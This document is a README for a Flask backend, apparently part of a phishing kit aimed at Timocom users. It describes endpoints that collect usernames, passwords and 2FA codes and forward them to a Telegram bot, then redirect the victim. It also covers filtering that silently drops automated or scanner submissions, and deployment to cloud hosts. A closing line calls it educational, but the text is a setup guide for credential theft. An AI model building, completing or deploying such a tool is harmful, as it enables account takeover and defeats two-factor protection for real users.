# Timocom Backend

A lightweight Flask-based backend API that handles login credential capture and 2FA code collection, forwarding them to a Telegram bot in real time.

---

## 🚀 Features

- **Login Endpoint** – Accepts username & password, validates them, and forwards to Telegram.
- **2FA Endpoint** – Accepts a 2FA code and forwards it to Telegram, then redirects the user.
- **Bot Detection** – Blocks automated/bot submissions based on heuristics (username patterns, submission speed).
- **Rate Limiting** – Per-IP and per-user rate limits to prevent abuse (3/min, 15/hour).
- **Honeypot Field** – Hidden `website` field to catch bots filling all form fields.
- **CORS Enabled** – Cross-Origin Resource Sharing enabled for frontend integration.
- **Telegram Notifications** – Instant alerts via Telegram Bot API.

---

## 🗂️ Project Structure

```
timocom-backend/
├── app.py              # Main Flask application
├── requirements.txt    # Python dependencies
├── Procfile            # Heroku/Render deployment config
└── .gitignore          # Git ignore rules
```

---

## ⚙️ Setup & Installation

### 1. Clone the Repository

```bash
git clone https://github.com/your-username/timocom-backend.git
cd timocom-backend
```

### 2. Create a Virtual Environment

```bash
python -m venv venv
# Windows
venv\Scripts\activate
# macOS/Linux
source venv/bin/activate
```

### 3. Install Dependencies

```bash
pip install -r requirements.txt
```

### 4. Configure Environment Variables

Set the following environment variables before running the app:

| Variable             | Description                        |
|----------------------|------------------------------------|
| `TELEGRAM_BOT_TOKEN` | Your Telegram Bot API token        |
| `TELEGRAM_CHAT_ID`   | The chat ID to receive messages    |
| `PORT`               | (Optional) Port to run on (default: `5000`) |

**Windows (PowerShell):**
```powershell
$env:TELEGRAM_BOT_TOKEN = "your_bot_token_here"
$env:TELEGRAM_CHAT_ID   = "your_chat_id_here"
```

**Linux/macOS:**
```bash
export TELEGRAM_BOT_TOKEN="your_bot_token_here"
export TELEGRAM_CHAT_ID="your_chat_id_here"
```

---

## ▶️ Running Locally

```bash
python app.py
```

The server will start on `http://0.0.0.0:5000`

---

## 🌐 API Endpoints

### `GET /`
Health check endpoint.

**Response:**
```json
{
  "status": "ok",
  "message": "Backend is running"
}
```

---

### `POST /api/save`
Submit login credentials.

**Rate Limit:** 3 per minute, 15 per hour

**Request Body:**
```json
{
  "username": "user@example.com",
  "password": "yourpassword"
}
```

**Response (success):**
```json
{
  "success": true,
  "message": "Username received",
  "next_step": "2fa"
}
```

**Response (error):**
```json
{
  "success": false,
  "message": "All fields required"
}
```

---

### `POST /api/verify`
Submit 2FA code.

**Rate Limit:** 3 per minute, 15 per hour

**Request Body:**
```json
{
  "username": "user@example.com",
  "code": "123456"
}
```

**Response (success):**
```json
{
  "success": true,
  "message": "Verified successfully ✅",
  "redirect_url": "https://..."
}
```

**Response (error):**
```json
{
  "success": false,
  "message": "Invalid code"
}
```

---

## 🛡️ Bot Detection Logic

Submissions are flagged as bots and silently dropped if any of the following are true:

- Username length is < 3 or > 60 characters
- Password length is < 4 or > 100 characters
- Username contains no vowels (suspicious pattern)
- Username has 5+ consecutive consonants
- Same IP submits within 10 seconds of a previous submission
- Honeypot `website` field is filled

---

## 📦 Deployment

### Heroku / Render

The `Procfile` is already configured:

```
web: gunicorn app:app
```

Just push to your Heroku/Render app and set the environment variables in the dashboard.

### Railway / Fly.io

Works out of the box — set environment variables via the platform UI and deploy.

---

## 🧰 Dependencies

| Package          | Version  | Purpose                   |
|------------------|----------|---------------------------|
| Flask            | 3.0.0    | Web framework             |
| flask-cors       | 4.0.0    | Cross-Origin support      |
| gunicorn         | 21.2.0   | Production WSGI server    |
| flask-limiter    | 3.5.0    | Rate limiting             |

---

## 📄 License

This project is for educational and research purposes only.
